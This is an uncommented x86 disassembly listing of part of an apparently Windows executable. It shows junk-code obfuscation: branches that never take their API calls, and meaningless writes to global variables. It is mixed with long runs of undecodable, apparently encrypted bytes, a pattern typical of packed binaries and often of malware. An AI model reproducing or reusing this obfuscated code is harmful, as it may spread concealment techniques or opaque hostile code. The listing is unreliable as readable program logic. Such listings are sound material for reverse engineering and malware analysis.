  418e45:	or     eax,0x8593050c
  418e4a:	pop    edx
  418e4b:	push   es
  418e4c:	cmc    
  418e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e4e:	loope  0x418ea7
  418e50:	sbb    eax,0x91e5bead
  418e55:	xchg   ebx,esi
  418e57:	pop    esp
  418e58:	xchg   DWORD PTR [esp+ebx*1],edx
  418e5b:	inc    eax
  418e5c:	pop    eax
  418e5d:	pop    ebx
  418e5e:	pop    es
  418e5f:	ja     0x418ed8
  418e61:	or     al,0xa3
  418e63:	es sbb al,0x3
  418e66:	dec    ecx
  418e67:	(bad)  
  418e68:	hlt    
  418e69:	rcr    BYTE PTR [ebp+0x62],cl
  418e6c:	mov    esi,0xaacb262b
  418e71:	aaa    
  418e72:	adc    ebx,DWORD PTR [edx+esi*8]
  418e75:	scas   al,BYTE PTR es:[edi]
  418e76:	or     eax,edi
  418e78:	jmp    0x158d:0xa645b5fb
  418e7f:	inc    esi
  418e80:	xchg   ebx,eax
  418e81:	dec    edi
  418e82:	popf   
  418e83:	addr16 aad 0xcd
  418e86:	outs   dx,BYTE PTR ds:[esi]
  418e87:	sbb    al,0x43
  418e89:	mov    esp,0x6f1d4b62
  418e8e:	xchg   edi,eax
  418e8f:	and    DWORD PTR [edx+0x3591e677],edi
  418e95:	mov    esp,0xe8c3139
  418e9a:	rcl    al,0xf0
  418e9d:	lods   eax,DWORD PTR ds:[esi]
  418e9e:	push   ds
  418e9f:	add    ah,BYTE PTR [esi+0x60]
  418ea2:	sbb    eax,0x69ee5549
  418ea7:	cwde   
  418ea8:	leave  
  418ea9:	cdq    
  418eaa:	iret   
  418eab:	inc    esp
  418eac:	(bad)  
  418ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eae:	hlt    
  418eaf:	dec    ebx
  418eb0:	mov    eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42835f,0x0
  418ec3:	mov    DWORD PTR ds:0x428127,0x216c
  418ecd:	mov    DWORD PTR ds:0x42822b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428223,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428233,0x562c
  418ef0:	mov    DWORD PTR ds:0x42825b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42835f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x4282e7
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428db4
  418f1a:	not    DWORD PTR ds:0x42815b
  418f20:	sub    DWORD PTR ds:0x42834f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428113
  418f32:	mov    edx,DWORD PTR ds:0x428257
  418f38:	sbb    DWORD PTR ds:0x42833b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428293
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x4282cb,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42834f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428363,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282bb,0x0
  418f6c:	not    DWORD PTR ds:0x428227
  418f72:	not    DWORD PTR ds:0x428157
  418f78:	mov    DWORD PTR ds:0x4282af,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x4282df
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282bb,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42833b
  418fb5:	call   DWORD PTR ds:0x428db8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x4281ef,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42814f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42833f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42814b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42812f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42811f,0x0
  41900e:	mov    DWORD PTR ds:0x428133,0x4347
  419018:	mov    DWORD PTR ds:0x428157,0x6064
  419022:	mov    DWORD PTR ds:0x42823f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428213,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42811f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428dbc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282af
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x4281eb
  41906c:	or     DWORD PTR ds:0x42832f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x6b8f3402]
  419095:	loopne 0x4190b2
  419097:	jle    0x4190d8
  419099:	ret    
  41909a:	push   ss
  41909b:	sbb    BYTE PTR [edx+edx*1+0x3ece1818],bh
  4190a2:	sub    bh,dh
  4190a4:	mov    al,ds:0xf64beb40
  4190a9:	inc    edx
  4190aa:	outs   dx,BYTE PTR ds:[esi]
  4190ab:	or     al,0xd1
  4190ad:	and    DWORD PTR [eax],edi
  4190af:	ins    DWORD PTR es:[edi],dx
  4190b0:	push   esi
  4190b1:	push   eax
  4190b2:	jl     0x4190c9
  4190b4:	xlat   BYTE PTR ds:[ebx]
  4190b5:	nop
  4190b6:	scas   al,BYTE PTR es:[edi]
  4190b7:	test   eax,0x96d5aa01
  4190bc:	icebp  
  4190bd:	or     DWORD PTR [edi],esp
  4190bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190c0:	mov    al,ds:0xd45b8971
  4190c5:	pop    ebx
  4190c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190c7:	addr16 inc esp
  4190c9:	aaa    
  4190ca:	sub    DWORD PTR [eax],esi
  4190cc:	out    0xb,eax
  4190ce:	aas    
  4190cf:	push   ecx
  4190d0:	ret    0xaa7d
  4190d3:	jns    0x419114
  4190d5:	pop    eax
  4190d6:	cmc    
  4190d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190d8:	cmp    al,0xc8
  4190da:	mov    edx,0x1d0df6d3
  4190df:	cmp    bh,dh
  4190e1:	dec    ecx
  4190e2:	inc    eax
  4190e3:	ds fwait
  4190e5:	adc    bl,BYTE PTR [ebx+0x6a344b16]
  4190eb:	inc    esp
  4190ec:	xchg   edx,eax
  4190ed:	add    edi,0xffffff88
  4190f0:	or     eax,eax
  4190f2:	adc    al,0x32
  4190f4:	daa    
  4190f5:	fdivp  st(0),st
  4190f7:	mov    dl,dl
  4190f9:	inc    ebx
  4190fa:	mov    ebx,0xbec01741
  4190ff:	jbe    0x4190f9
  419101:	clc    
  419102:	and    esi,DWORD PTR [edi+ecx*2-0x6d]
  419106:	push   0x17
  419108:	adc    DWORD PTR [ebx-0x3fe5cf5b],0x61
  41910f:	or     al,0x91
  419111:	pop    eax
  419112:	xchg   dh,bl
  419114:	and    ebx,DWORD PTR ds:0xed07f18e
  41911a:	cmp    BYTE PTR [ebp+0x41df9dd7],0x56
  419121:	hlt    
  419122:	lds    ecx,FWORD PTR [esi+0x29]
  419125:	mov    eax,0x84ae78ce
  41912a:	popf   
  41912b:	jmp    0x2d10:0x9ceed841
  419132:	push   0x39
  419134:	ss add eax,0xb0b991e2
  41913a:	bsr    esp,DWORD PTR [edx]
  41913d:	inc    eax
  41913e:	pop    ecx
  41913f:	xchg   edx,eax
  419140:	and    bl,bh
  419142:	imul   edi,DWORD PTR [eax-0x1c],0x1389a98b
  419149:	xchg   ebp,eax
  41914a:	mov    eax,0x8e099e17
  41914f:	inc    ecx
  419150:	jmp    0x41914e
  419152:	pop    edi
  419153:	push   ecx
  419154:	pmaddwd mm5,QWORD PTR [edx]
  419157:	cmp    BYTE PTR [ebx+edi*2],bl
  41915a:	cdq    
  41915b:	sbb    DWORD PTR [edi],0x5e
  41915e:	xor    ebp,ebx
  419160:	daa    
  419161:	add    BYTE PTR [edi+0x13],0x74
  419165:	in     eax,dx
  419166:	cmp    edx,DWORD PTR [ebp-0x6a]
  419169:	sar    BYTE PTR ds:0x3c0027f4,1
  41916f:	cmp    ebp,ecx
  419171:	pop    eax
  419172:	dec    esp
  419173:	cld    
  419174:	jo     0x4191de
  419176:	ins    DWORD PTR es:[edi],dx
  419177:	mov    ?,edi
  419179:	adc    BYTE PTR [edi+0x42],bh
  41917c:	push   ds
  41917d:	int    0x9d
  41917f:	mov    esi,ebx
  419181:	pcmpgtw mm3,QWORD PTR [ebx-0x1b]
  419185:	and    DWORD PTR [edx+ebp*4+0xf2a0aee],ebx
  41918c:	pop    ebp
  41918d:	popf   
  41918e:	and    ebx,ebp
  419190:	mov    dh,BYTE PTR [esi-0x64]
  419193:	pop    esp
  419194:	lock out 0x82,al
  419197:	or     eax,0xadb45a22
  41919c:	xchg   ecx,eax
  41919d:	add    ch,BYTE PTR [esi+0x68]
  4191a0:	in     eax,dx
  4191a1:	inc    ebx
  4191a2:	add    al,0x36
  4191a4:	std    
  4191a5:	cmc    
  4191a6:	pop    eax
  4191a7:	loopne 0x419194
  4191a9:	adc    al,0xd7
  4191ab:	icebp  
  4191ac:	fbstp  TBYTE PTR [edi+edx*4+0x2e7e7257]
  4191b3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4191b5:	stos   BYTE PTR es:[edi],al
  4191b6:	fwait
  4191b7:	pop    esi
  4191b8:	sti    
  4191b9:	enter  0x72ad,0x7e
  4191bd:	clc    
  4191be:	push   0x6a
  4191c0:	(bad)  
  4191c1:	sub    al,0x84
  4191c3:	ficomp DWORD PTR [ebp+0x72]
  4191c6:	es hlt 
  4191c8:	mul    BYTE PTR [ebx+0x15b76400]
  4191ce:	and    esi,DWORD PTR [ebp+ebx*8+0x53dc3980]
  4191d5:	sbb    edi,ebp
  4191d7:	out    0x9c,al
  4191d9:	add    bh,BYTE PTR [esi+0x12119145]
  4191df:	and    eax,0xe3fe3e23
  4191e4:	push   ecx
  4191e5:	bound  ebp,QWORD PTR [esi]
  4191e7:	scas   al,BYTE PTR es:[edi]
  4191e8:	xor    bl,BYTE PTR [edi+eiz*1]
  4191eb:	and    eax,0xbce1d70f
  4191f0:	mov    ds:0x61802be6,al
  4191f5:	sti    
  4191f6:	mov    esi,0xe05d6859
  4191fb:	pop    ecx
  4191fc:	push   edi
  4191fd:	mov    dh,BYTE PTR [eax]
  4191ff:	cmp    dh,al
  419201:	pop    ss
  419202:	jmp    0x654d:0xdda5ecec
  419209:	das    
  41920a:	inc    ecx
  41920b:	jmp    0x41924a
  41920d:	loopne 0x419195
  41920f:	sar    DWORD PTR [edi+edi*2+0x2f],1
  419213:	xlat   BYTE PTR ds:[ebx]
  419214:	shr    BYTE PTR [esi],0x3d
  419217:	xchg   DWORD PTR [ebp-0x2d],ecx
  41921a:	(bad)  
  41921b:	mov    dh,0x35
  41921d:	mov    bh,0x15
  41921f:	sbb    ebx,DWORD PTR [esi+0x16]
  419222:	push   es
  419223:	xor    edx,ebx
  419225:	test   al,0x96
  419227:	retf   0xfea8
  41922a:	cwde   
  41922b:	ret    
  41922c:	mov    ebp,eax
  41922e:	call   DWORD PTR [ebp+esi*1+0x7]
  419232:	dec    edx
  419233:	call   0x4a0f88c2
  419238:	mov    ebp,0x4c685a8f
  41923d:	xchg   ebx,eax
  41923e:	mov    ds:0x4d7794e8,al
  419243:	jg     0x419238
  419245:	jno    0x419272
  419247:	sub    edi,DWORD PTR [esp+ebx*2-0x3c]
  41924b:	ss inc edi
  41924d:	jne    0x419223
  41924f:	fild   WORD PTR [esi+ecx*8-0xa65998b]
  419256:	test   DWORD PTR [edi+0x47],esi
  419259:	pop    ebp
  41925a:	js     0x419216
  41925c:	jle    0x4192b1
  41925e:	call   0xc510:0x4b27a53b
  419265:	cdq    
  419266:	jb     0x41925a
  419268:	(bad)  
  419269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41926a:	(bad)  
  41926b:	jg     0x419237
  41926d:	adc    BYTE PTR [esi],ah
  41926f:	ficom  DWORD PTR [eax+0x4f]
  419272:	add    ah,dh
  419274:	sub    ebx,DWORD PTR [edx+0x5b]
  419277:	cmp    esp,DWORD PTR [ecx+esi*1-0x7a]
  41927b:	inc    ebx
  41927c:	icebp  
  41927d:	ins    BYTE PTR es:[edi],dx
  41927e:	arpl   WORD PTR [ebp+0x6f3e250b],si
  419284:	jmp    0xb700:0x157ca1d
  41928b:	xchg   ecx,eax
  41928c:	das    
  41928d:	xchg   ebp,eax
  41928e:	in     al,0x9c
  419290:	test   eax,0x6e91b94f
  419295:	idiv   DWORD PTR [ecx-0x1a]
  419298:	ror    ecx,0x1c
  41929b:	bound  ebx,QWORD PTR [ebp+0xbd4c112]
  4192a1:	inc    ebp
  4192a2:	adc    cl,dh
  4192a4:	add    ch,BYTE PTR [eax]
  4192a6:	mov    ds:0x39a18590,eax
  4192ab:	les    ebp,FWORD PTR [esi-0x4fb5dd2e]
  4192b1:	neg    esi
  4192b3:	scas   eax,DWORD PTR es:[edi]
  4192b4:	fmul   QWORD PTR [ebp+0x5e]
  4192b7:	icebp  
  4192b8:	loope  0x4192f0
  4192ba:	(bad)  
  4192bb:	ins    BYTE PTR es:[edi],dx
  4192bc:	nop
  4192bd:	clc    
  4192be:	dec    esi
  4192bf:	enter  0x68e5,0xa8
  4192c3:	cmp    edi,DWORD PTR [eax+0x0]
  4192c6:	push   ss
  4192c7:	sub    al,0xc7
  4192c9:	sbb    BYTE PTR [ecx+0x2b10af97],ch
  4192cf:	or     cl,BYTE PTR [ebx]
  4192d1:	sub    esi,DWORD PTR [eax+0x4e]
  4192d4:	sahf   
  4192d5:	pop    ebx
  4192d6:	dec    ebx
  4192d7:	cmp    BYTE PTR [ebp-0x38],cl
  4192da:	rol    DWORD PTR [esi-0x27],cl
  4192dd:	test   edi,0xf276a650
  4192e3:	xor    ah,BYTE PTR [ecx+0x57]
  4192e6:	popf   
  4192e7:	cmp    BYTE PTR [ebp-0x2d],dh
  4192ea:	xchg   edx,eax
  4192eb:	bnd jb 0x41934b
  4192ee:	jae    0x419350
  4192f0:	(bad)  
  4192f1:	mov    bh,0xdd
  4192f3:	mov    eax,0xee35c7ac
  4192f8:	repnz out 0xd0,eax
  4192fb:	pop    ebx
  4192fc:	cld    
  4192fd:	add    edi,DWORD PTR [ebp+0x3a]
  419300:	ins    DWORD PTR es:[edi],dx
  419301:	inc    ebx
  419302:	(bad)  
  419303:	out    dx,eax
  419304:	out    dx,eax
  419305:	scas   al,BYTE PTR es:[edi]
  419306:	mov    cl,0x2e
  419308:	mov    esp,0xcb8a45b2
  41930d:	test   DWORD PTR [edx],0x50ac86ac
  419313:	xor    BYTE PTR [ecx+0x4d],0xa5
  419317:	rcr    DWORD PTR [ecx-0x6b],0x4b
  41931b:	int    0x21
  41931d:	add    eax,0x8bbe515d
  419322:	ins    DWORD PTR es:[edi],dx
  419323:	in     eax,0x0
  419325:	leave  
  419326:	mov    bl,BYTE PTR [eax]
  419328:	dec    edx
  419329:	retf   
  41932a:	cli    
  41932b:	cmp    bl,BYTE PTR [edx+0x62]
  41932e:	adc    DWORD PTR [ebx+eiz*8+0x15],edx
  419332:	push   cs
  419333:	out    0x5a,al
  419335:	in     al,0x52
  419337:	test   eax,0xba6089e6
  41933c:	inc    ecx
  41933d:	jp     0x41933e
  41933f:	scas   al,BYTE PTR es:[edi]
  419340:	and    DWORD PTR ds:0xbbc867d3,esi
  419346:	or     al,0xa5
  419348:	imul   edx,DWORD PTR [ecx],0x42
  41934b:	pop    ds
  41934c:	mov    edx,0x3b7fc156
  419351:	inc    ecx
  419352:	shl    DWORD PTR [esi],cl
  419354:	lea    esi,ds:0xd7776fa7
  41935a:	mov    bl,0x6e
  41935c:	scas   eax,DWORD PTR es:[edi]
  41935d:	out    dx,al
  41935e:	lds    ebp,FWORD PTR [ecx]
  419360:	lea    ecx,ds:0xea0965e1
  419366:	cmp    edx,DWORD PTR [edi+0x5]
  419369:	mov    ecx,0xcfcdc918
  41936e:	fidivr DWORD PTR [edx-0x677d822]
  419374:	mov    bl,0xc
  419376:	pop    ds
  419377:	sub    BYTE PTR [edi-0x4b1c1f78],bh
  41937d:	mov    ds:0x3f9f548c,eax
  419382:	fidiv  DWORD PTR [ebx]
  419384:	cmc    
  419385:	xor    esp,DWORD PTR [edi-0x4a]
  419388:	sbb    ah,BYTE PTR [ebp+0x49887da8]
  41938e:	lea    ebx,[ecx+esi*4+0x5c]
  419392:	stos   DWORD PTR es:[edi],eax
  419393:	jp     0x4193fa
  419395:	push   eax
  419396:	jno    0x41931e
  419398:	test   cx,si
  41939b:	jmp    0x92bbc60e
  4193a0:	js     0x4193fe
  4193a2:	push   ecx
  4193a3:	inc    esi
  4193a4:	cmp    DWORD PTR [esi+0x11],esp
  4193a7:	jge    0x4193b9
  4193a9:	inc    ecx
  4193aa:	sbb    al,0xcf
  4193ac:	jge    0x4193b1
  4193ae:	cmp    ch,BYTE PTR [ebp+0x6168e8e]
  4193b4:	sbb    eax,0x38fa4026
  4193b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ba:	adc    bl,dl
  4193bc:	fiadd  WORD PTR [ebx]
  4193be:	xchg   esp,eax
  4193bf:	xchg   edx,eax
  4193c0:	ror    BYTE PTR [ebp+0x431db00b],0x63
  4193c7:	or     eax,0x9093d16c
  4193cc:	jg     0x41943b
  4193ce:	dec    esi
  4193cf:	test   eax,0xe08e655c
  4193d4:	xchg   ebx,eax
  4193d5:	add    DWORD PTR [ebx+ebx*1+0x6f7f7b26],ebp
  4193dc:	ss ins BYTE PTR es:[edi],dx
  4193de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193df:	ror    DWORD PTR [eax],cl
  4193e1:	aam    0xd4
  4193e3:	arpl   ax,bx
  4193e5:	pop    edi
  4193e6:	sbb    al,0xd
  4193e8:	push   es
  4193e9:	jmp    0xdbdc:0x9cbe4215
  4193f0:	inc    ebx
  4193f1:	retf   
  4193f2:	scas   eax,DWORD PTR es:[edi]
  4193f3:	ret    0x19fa
  4193f6:	lods   eax,DWORD PTR ds:[esi]
  4193f7:	enter  0x84f4,0xbe
  4193fb:	and    BYTE PTR [esi+0xc5f29f4],0x68
  419402:	xchg   BYTE PTR [edx],dh
  419404:	push   es
  419405:	sbb    DWORD PTR [edi+0x35],esi
  419408:	dec    edx
  419409:	or     ecx,ebp
  41940b:	stos   DWORD PTR es:[edi],eax
  41940c:	fdiv   st,st(4)
  41940e:	and    eax,DWORD PTR [esi+0x76]
  419411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419412:	mov    bh,0xb9
  419414:	mov    cl,0xf5
  419416:	rol    BYTE PTR [eax+0x28d3045a],0xf
  41941d:	scas   al,BYTE PTR es:[edi]
  41941e:	xor    eax,0x45030e77
  419423:	mov    BYTE PTR [esi+0x3441e302],cl
  419429:	push   0xffffffd4
  41942b:	cmp    eax,0xab189d09
  419430:	cld    
  419431:	jg     0x419421
  419433:	adc    eax,0x11e24d94
  419438:	pop    eax
  419439:	(bad)  
  41943a:	in     al,0x2
  41943c:	outs   dx,BYTE PTR ds:[esi]
  41943d:	rcl    BYTE PTR [ecx],1
  41943f:	sbb    ch,dh
  419441:	jo     0x419453
  419443:	mov    edx,esi
  419445:	mov    eax,ds:0xf2daa71b
  41944a:	push   ss
  41944b:	mov    esi,0x993a5ca7
  419450:	push   ebp
  419451:	or     BYTE PTR [ebx+0x84248c],0x0
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	inc    DWORD PTR [ecx-0x76ffffbe]
  419465:	sbb    eax,0x428357
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428363,0x3a28
  419482:	cmp    DWORD PTR ds:0x4281ff,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428dc0
  41949a:	mov    DWORD PTR ds:0x42823b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282a3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x4282db,edx
  4194b2:	mov    DWORD PTR ds:0x428263,0x52b1
  4194bc:	or     DWORD PTR ds:0x42813b,edx
  4194c2:	and    DWORD PTR ds:0x42833f,ecx
  4194c8:	cmp    DWORD PTR ds:0x4282e7,0x0
  4194cf:	mov    DWORD PTR ds:0x4282e7,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428263,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428363,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42813f,0x3203
  419506:	cmp    DWORD PTR ds:0x4282e7,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42807b
  419518:	push   0x42805f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e54
  419528:	adc    DWORD PTR ds:0x428147,0x266f
  419532:	xor    DWORD PTR ds:0x42833f,ebx
  419538:	xor    DWORD PTR ds:0x4282c7,ecx
  41953e:	mov    DWORD PTR ds:0x428137,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428213
  41954e:	dec    DWORD PTR ds:0x4282c7
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282b7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42834b,0x428367
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42814f,0x0
  419589:	mov    DWORD PTR ds:0x42813f,0x514f
  419593:	mov    DWORD PTR ds:0x428143,0x65eb
  41959d:	mov    DWORD PTR ds:0x4281f3,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428253,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42814f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42800d
  4195cd:	push   0x428029
  4195d2:	call   DWORD PTR ds:0x428e58
  4195d8:	adc    DWORD PTR ds:0x428267,ecx
  4195de:	and    DWORD PTR ds:0x42825b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428133,ebx
  4195ee:	and    DWORD PTR ds:0x42823f,0x6136
  4195f8:	add    DWORD PTR ds:0x428147,ebx
  4195fe:	mov    eax,ds:0x422518
  419603:	and    DWORD PTR ds:0x4282cf,0x428237
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42812b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428153,0x428127
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428237,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428267,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42823f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428253,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428143,0x428113
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428247,0x42820f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42812b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42812b,0x4282b7
  4196ab:	push   0x42239c
  4196b0:	sbb    DWORD PTR ds:0x428243,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x4281eb,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x4281ff
  4196da:	sbb    DWORD PTR ds:0x4282e3,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428213,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42822f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x4281fb,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428333,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282af
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42822b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428343,0x5836
  419737:	cmp    DWORD PTR ds:0x428333,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428dc4
  41974d:	movzx  edx,BYTE PTR ds:0x42812b
  419754:	adc    DWORD PTR ds:0x4282b3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428267
  419761:	add    DWORD PTR ds:0x42814b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42825f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42814b,0x0
  419781:	mov    DWORD PTR ds:0x428213,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42822b,ebx
  419797:	cmp    DWORD PTR ds:0x42814b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428dc8
  4197bf:	sub    DWORD PTR ds:0x428243,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282bf,0x4281ff
  4197d3:	add    DWORD PTR ds:0x42821f,0x428147
  4197dd:	mov    ebx,DWORD PTR ds:0x428167
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428277
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x4281f7,ecx
  4197f8:	and    DWORD PTR ds:0x42824f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x4282cf
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42814b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428337,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x4282d7,0x6cf
  41984e:	mov    DWORD PTR ds:0x428363,0x6551
  419858:	cmp    DWORD PTR ds:0x42814b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e5c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42836b
  419891:	mov    ecx,DWORD PTR ds:0x42836f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42825b
  4198a2:	cmp    DWORD PTR ds:0x42811f,0x0
  4198a9:	mov    DWORD PTR ds:0x428113,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x4282df
